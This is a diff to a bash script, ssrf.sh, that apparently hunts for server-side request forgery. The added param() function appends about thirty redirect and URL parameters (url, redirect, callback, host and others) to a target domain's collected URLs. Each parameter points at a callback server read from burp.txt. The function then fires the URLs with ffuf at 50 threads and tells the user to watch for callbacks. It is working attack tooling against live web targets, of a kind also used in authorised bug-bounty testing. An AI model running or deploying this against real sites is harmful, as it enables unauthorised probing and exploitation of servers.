@@ -21,10 +21,10 @@ killit(){
         logo
         echo "Usage : ./ssrf.sh domain.com"
         echo "Usage : ./ssrf.sh domain.com -o output_directory"
-        echo "Usage : ./ssrf.sh domain.com --output output_directory"
+       	echo "Usage : ./ssrf.sh domain.com -ap"
+	       echo "Usage : ./ssrf.sh domain.com -o output_directory -ap"
         exit 1
 }
-
 recon(){
 logo
 
@@ -65,15 +65,37 @@ cat $output_directory/$1/Results-200.txt | qsreplace FUZZ > $output_directory/$1
 ffuf -w "$output_directory/$1/fuzzable.txt:URL" -w burp.txt -u URLFUZZ -v
 echo "${red} --------------DONE---------------- ${reset}"
 }
+param(){
+echo -e "\n\e[31m[Making List of Appened SSRF Params And Fire Them]\e[0m"
+ser=`cat burp.txt`
+cat $output_directory/$1/Results-200.txt | sort | uniq | grep "?" | qsreplace -a | qsreplace $ser > $output_directory/$1/appended_params.txt
+sed -i "s|$|\&dest=$ser\&redirect=$ser\&uri=$ser\&path=$ser\&continue=$ser\&url=$ser\&window=$ser\&next=$ser\&data=$ser\&reference=$ser\&site=$ser\&html=$ser\&val=$ser\&validate=$ser\&domain=$ser\&callback=$ser\&return=$ser\&page=$ser\&feed=$ser\&host=$ser&\port=$ser\&to=$ser\&out=$ser\&view=$ser\&dir=$ser\&show=$ser\&navigation=$ser\&open=$ser|g" $output_directory/$1/appended_params.txt
+echo -e "\nTOTAL NUMBER OF URLS APPENED WITH PARAMS [$(cat $output_directory/$1/appended_params.txt | wc -l)]"
+echo "${red}-----------------------Check Your Server for Potential Callbacks------------------------- ${reset}"
+ffuf -w $output_directory/$1/appended_params.txt -u FUZZ -t 50 
+echo "${red} --------------DONE---------------- ${reset}"
+}
 
 if [[ -z "$1" || $1 == "-h" || $1 == "--help" ]]
         then
                 killit
-elif [[ $2 == "-o" || $2 == "--output" ]]
+elif [[ $2 == "-o" && $4 == "-ap" ]]
+        then
+        output_directory="$3/gaussrf/recon/"
+        mkdir -p "$output_directory"/"$1"
+        recon $1
+	param $1
+elif [[ $2 == "-o" ]]
 then
   output_directory="$3/gaussrf/recon/"
   mkdir -p "$output_directory"/"$1"
   recon $1
+elif [[ $2 == "-ap" ]]
+then
+  output_directory="recon"
+  mkdir -p "$output_directory"/"$1"
+  recon $1
+  param $1
 else
   output_directory="recon"
   mkdir -p "$output_directory"/"$1"
